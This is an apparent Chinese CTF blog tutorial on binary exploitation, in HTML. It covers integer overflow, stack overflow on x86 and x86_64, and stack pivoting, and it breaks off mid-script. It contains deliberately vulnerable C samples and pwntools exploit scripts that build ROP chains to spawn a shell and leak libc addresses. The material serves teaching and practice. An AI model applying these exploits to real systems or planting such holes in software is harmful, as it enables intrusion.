@@ -1,0 +1,692 @@
+<!DOCTYPE html>
+<html lang=zh-CN>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta property="og:description" content="">
+    <meta property="og:type" content="website">
+    <meta name="description" content="">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        pwn利用方法（一） - rot_will&#39;s Blog
+        
+    </title>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/aircloud.css">
+
+    
+<link rel="stylesheet" href="/css/gitment.css">
+
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_28hi1hpxx24.css" rel="stylesheet" type="text/css">
+    <link href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i>  </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/img/avatar.png" />
+        </div>
+        <div class="name">
+            <i>rot_will</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>主页</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>标签</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>存档</span>
+                </a>
+            </li>
+            <li >
+                <a href="/collect/">
+                    <i class="iconfont icon-shoucang1"></i>
+                    <span>收藏</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>关于</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>搜索</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA"><span class="toc-text">整数溢出</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-text">栈溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%BA%A2%E5%87%BA"><span class="toc-text">简单溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#x86"><span class="toc-text">x86</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x86-64"><span class="toc-text">x86_64</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="toc-text">栈迁移</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%83%BD%E5%A4%9F%E8%A6%86%E7%9B%96ret"><span class="toc-text">能够覆盖ret</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E6%B3%95%E8%A6%86%E7%9B%96ret"><span class="toc-text">无法覆盖ret</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2csu"><span class="toc-text">ret2csu</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SROP"><span class="toc-text">SROP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-text">格式化字符串</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%88%E8%A1%8C%E7%9F%A5%E8%AF%86"><span class="toc-text">先行知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E4%B8%AD%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-text">栈中格式化字符串</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E6%A0%88%E4%B8%AD%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-text">非栈中格式化字符串</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D"><span class="toc-text">第一种</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D"><span class="toc-text">第二种</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ret2dlresolve"><span class="toc-text">ret2dlresolve</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9dynamic"><span class="toc-text">修改dynamic</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0reloc-offset"><span class="toc-text">伪造reloc_offset</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0link-map"><span class="toc-text">伪造link_map</span></a></li></ol></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-bg" id="search-bg"></div>
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">搜索</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i>  </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        pwn利用方法（一）
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">发布于：<span>2022-06-23 19:41:54</span></span>
+        
+        <span class="attr">标签：/
+        
+        <a class="tag" href="/tags/#ctf" title="ctf">ctf</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#pwn" title="pwn">pwn</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content no-indent">
+        <h1 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h1><p>由于数据类型的使用不当产生的利用点<br>如:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> a=<span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> c[<span class="number">10</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    read(<span class="number">0</span>,c,<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">if</span> (c[<span class="number">0</span>]==<span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">        a=atoi(c);</span><br><span class="line">        <span class="keyword">if</span> (a&gt;=<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (a&lt;<span class="number">10</span>) &#123;</span><br><span class="line">                system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在这个示例中，输入<code>4294967295</code>，是可以执行 <code>system(&quot;/bin/sh&quot;);</code> ，因为<code>a</code>是<code>int</code>类型，默认为<code>4字节有符号整型</code>，而<code>4294967295</code>的十六进制为 <code>0xffffffff</code>,刚好为<code>-1</code>的补码 ，所以实际a的值为<code>-1</code>, <code>-1&lt;0&lt;10</code>,所以可以绕过判断执行<code>system(&quot;/bin/sh&quot;);</code></p>
+<h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><h2 id="简单溢出"><a href="#简单溢出" class="headerlink" title="简单溢出"></a>简单溢出</h2><blockquote>
+<p>当程序对输入的数据大小没有限制或限制不严谨，就会出现栈溢出</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 样例代码 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> *binsh=<span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span>&#123;</span><br><span class="line">    system(<span class="string">&quot;date&quot;</span>);</span><br><span class="line">    <span class="type">char</span> a[<span class="number">0x20</span>]=&#123;&#125;;</span><br><span class="line">    read(<span class="number">0</span>,a,<span class="number">0x50</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*编译命令</span></span><br><span class="line"><span class="comment">    gcc 1.c -m64 -o s64 -fno-stack-protector -no-pie</span></span><br><span class="line"><span class="comment">    gcc 1.c -m32 -o s32 -fno-stack-protector -no-pie</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h3><blockquote>
+<p><strong>调用vuln函数过程</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-%E6%BA%A2%E5%87%BA.jpg"></p>
+</blockquote>
+<blockquote>
+<p><strong>vuln函数返回过程</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-%E6%BA%A2%E5%87%BA-1.jpg"></p>
+</blockquote>
+<p>通过返回过程可以看出，如果将栈中储存的<code>vuln返回地址</code>修改了，就可以控制程序执行流程，且参数就放在 返回地址后面，这样调用某个函数并传参非常方便</p>
+<blockquote>
+<p><strong>main函数代码</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-%E6%BA%A2%E5%87%BA1.jpg"></p>
+</blockquote>
+<blockquote>
+<p><strong>vuln函数代码</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-%E6%BA%A2%E5%87%BA1-1.jpg"></p>
+</blockquote>
+<blockquote>
+<p><strong>vuln函数栈布局</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-%E6%BA%A2%E5%87%BA1-2.jpg"></p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    通过栈溢出，控制返回地址为 system@plt ,并设置参数为 &quot;/bin/sh&quot; </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    system函数在plt表中的地址为 0x8049090</span></span><br><span class="line"><span class="string">    /bin/sh 字符串在程序中的地址为 0x804a008</span></span><br><span class="line"><span class="string">    ret 指令地址为 0x804900e</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./s32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret=<span class="number">0x0804900e</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x8049090</span>)+p32(ret)+p32(<span class="number">0x804a008</span>))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    设置vuln函数返回地址为 0x8049090</span></span><br><span class="line"><span class="string">    设置system函数返回地址为 0x804900e (任意地址)</span></span><br><span class="line"><span class="string">    设置system函数参数为 0x804a008</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="x86-64"><a href="#x86-64" class="headerlink" title="x86_64"></a>x86_64</h3><blockquote>
+<p><strong>调用vuln函数过程</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-%E6%BA%A2%E5%87%BA-2.jpg"></p>
+</blockquote>
+<blockquote>
+<p><strong>vuln函数返回过程</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-%E6%BA%A2%E5%87%BA-3.jpg"></p>
+</blockquote>
+<p>通过返回过程可以看出，如果将栈中储存的<code>vuln返回地址</code>修改了，就可以控制程序执行流程，但前6个参数通过寄存器传入，调用某个函数并传参，就比较麻烦，需要找到<code>pop xxx;ret</code> 指令，控制寄存器</p>
+<blockquote>
+<p><strong>main函数代码</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-%E6%BA%A2%E5%87%BA2.jpg"></p>
+</blockquote>
+<blockquote>
+<p><strong>vuln函数代码</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-%E6%BA%A2%E5%87%BA2-1.jpg"></p>
+</blockquote>
+<blockquote>
+<p><strong>vuln函数栈布局</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-%E6%BA%A2%E5%87%BA2-2.jpg"></p>
+</blockquote>
+<ul>
+<li>exp思路: <blockquote>
+<p>通过栈溢出，先调用<code>pop rdi;ret</code>指令，设置<code>system函数</code>的参数，然后调用<code>system@plt</code></p>
+</blockquote>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    通过栈溢出，先调用 pop rdi;ret 指令，设置 system函数 的参数，</span></span><br><span class="line"><span class="string">    然后调用 system@plt </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    system函数在plt表中的地址为 0x401060</span></span><br><span class="line"><span class="string">    /bin/sh 字符串在程序中的地址为 0x402004</span></span><br><span class="line"><span class="string">    ret 指令地址为 0x40101a</span></span><br><span class="line"><span class="string">    pop rdi;ret 指令地址为 0x4012b3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">rdi=<span class="number">0x4012b3</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">p=process(<span class="string">&#x27;./s64&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;bp %s&#x27;</span>%ret)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>+p64(ret)+p64(rdi)+p64(<span class="number">0x402004</span>)+p64(<span class="number">0x401060</span>))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    设置vuln函数返回地址为 0x40101a 用来对齐栈</span></span><br><span class="line"><span class="string">    设置rdi寄存器的值为 0x402004</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-%E6%BA%A2%E5%87%BA-4.jpg"><br>因为在<code>system</code>函数中 执行了指令 <code>movaps xmmword ptr[rsp+0x50],xmm0</code>, 即 向 <code>rsp+0x50</code>的地址处写入 <code>128</code> 位的数据, 而 <code>movaps</code>指令需要对齐，所以<code>rsp+0x50</code>指向的地址就要与<code>128位</code>(<code>0x10字节</code>)对齐 ,但这里<code>rsp</code>指向的地址为<code>0x7ffcc3740e48</code>显然无法与<code>0x10</code>对齐, 所以在执行<code>system</code>函数时会导致程序中断, 虽然按照逻辑是可以获取<code>shell</code>的,但因为程序中断了,所以获取不了<code>shell</code></p>
+<h2 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h2><blockquote>
+<p>当存在栈溢出，但溢出的数据较小时，可以尝试使用栈迁移</p>
+</blockquote>
+<h3 id="能够覆盖ret"><a href="#能够覆盖ret" class="headerlink" title="能够覆盖ret"></a>能够覆盖ret</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*样例代码*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> a[<span class="number">0x20</span>]=&#123;&#125;;</span><br><span class="line">    read(<span class="number">0</span>,a,<span class="number">0x30</span>);</span><br><span class="line">    write(<span class="number">1</span>,a,<span class="number">0x30</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*编译命令</span></span><br><span class="line"><span class="comment">    gcc pwn_tran.c -fno-stack-protector -no-pie -o pwn_tran</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>在这个仅向栈中写入数据的例子中，数据的地址必须通过<code>rbp</code>计算得到</p>
+</blockquote>
+<blockquote>
+<p><strong>main 函数代码</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-%E8%BF%81%E7%A7%BB.jpg"></p>
+</blockquote>
+<blockquote>
+<p><strong>main 函数栈布局</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-%E8%BF%81%E7%A7%BB-1.jpg"></p>
+</blockquote>
+<blockquote>
+<p><strong>main 函数汇编代码</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-%E8%BF%81%E7%A7%BB-2.jpg"><br>存在 <code>leave;ret</code> 相当于 <code>mov rsp,rbp;pop rbp;ret</code></p>
+</blockquote>
+<p>程序中不存在后门函数，那么想要获取<code>shell</code>, 就需要获取libc地址，通过栈迁移构造<code>system(&quot;/bin/sh&quot;);</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    将栈迁移到 got表 附近通过 write 获取程序引用的 libc在内存中的基地址 </span></span><br><span class="line"><span class="string">    然后将栈迁移到 bss段 中较高的地址处，执行 system函数 </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;pwn_tran&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;libc-2.33.so&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">leave=<span class="number">0x4011bd</span></span><br><span class="line">ret=<span class="number">0x4011be</span></span><br><span class="line">read=<span class="number">0x401182</span></span><br><span class="line">write=<span class="number">0x40119d</span></span><br><span class="line">bss=<span class="number">0x404048</span></span><br><span class="line">read_got=<span class="number">0x404020</span></span><br><span class="line">rdi=<span class="number">0x0000000000401223</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(bss)+p64(read))</span><br><span class="line">p.read()</span><br><span class="line">payload=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(bss+<span class="number">0x800</span>)+p64(read)+p64(bss-<span class="number">0x18</span>)+p64(bss-<span class="number">0x18</span>)+p64(write)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.read(<span class="number">0x40</span>)</span><br><span class="line">read_addr=u64(p.read(<span class="number">8</span>))</span><br><span class="line">libc.address=read_addr-libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line">system=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">bss=bss+<span class="number">0x700</span></span><br><span class="line">payload=p64(bss+<span class="number">0x200</span>)+p64(rdi)+p64(bin_sh)+p64(system)+p64(bss+<span class="number">0x100</span>-<span class="number">0x20</span>)+p64(leave)</span><br><span class="line"><span class="comment"># 在调用system时不能使用上面在bss段中设置的/bin/sh作为参数 ,因为他在调用write函数时被修改了</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="无法覆盖ret"><a href="#无法覆盖ret" class="headerlink" title="无法覆盖ret"></a>无法覆盖ret</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*样例代码*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> b[<span class="number">0x20</span>]=&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> a[<span class="number">0x20</span>]=&#123;&#125;;</span><br><span class="line">    read(<span class="number">0</span>,a,<span class="number">0x28</span>);</span><br><span class="line">    read(<span class="number">0</span>,b,<span class="number">0x60</span>);</span><br><span class="line">    write(<span class="number">1</span>,b,<span class="number">0x60</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> a=<span class="number">0</span>;</span><br><span class="line">    func();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*编译命令</span></span><br><span class="line"><span class="comment">    gcc pwn_tran.c -fno-stack-protector -no-pie -o pwn_tran</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>main 函数代码</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-%E8%BF%81%E7%A7%BB1.jpg"></p>
+</blockquote>
+<blockquote>
+<p><strong>main 函数栈布局</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-%E8%BF%81%E7%A7%BB1-1.jpg"></p>
+</blockquote>
+<blockquote>
+<p><strong>main 函数汇编代码</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-%E8%BF%81%E7%A7%BB1-2.jpg"></p>
+</blockquote>
+<blockquote>
+<p><strong>func 函数代码</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-%E8%BF%81%E7%A7%BB1-3.jpg"></p>
+</blockquote>
+<blockquote>
+<p><strong>func 函数栈布局</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-%E8%BF%81%E7%A7%BB1-4.jpg"></p>
+</blockquote>
+<blockquote>
+<p><strong>func 函数汇编代码</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-%E8%BF%81%E7%A7%BB1-5.jpg"></p>
+</blockquote>
+<ul>
+<li>就我现在的认知来说，当栈溢出只能修改<code>rbp</code>时，至少需要在返回时连续执行两次<code>leave</code>，才可能控制程序<ul>
+<li>如果在函数返回后，不存在对向栈中写入数据的操作，则需要用户在迁移前向一块地址已知的区域写入数据，否则就无法控制程序流</li>
+<li>如果在函数返回后，存在向栈中写入数据的操作(写入数据地址通过rbp计算)，那么依旧可以控制程序流</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    因为程序允许向 bss 段中写入数据，而且在 main 函数中也存在 leave;ret 指令，</span></span><br><span class="line"><span class="string">    所以我们在 func 函数中将 rbp 设置为全局变量 b ，</span></span><br><span class="line"><span class="string">    然后通过 main 函数中的 leave;ret 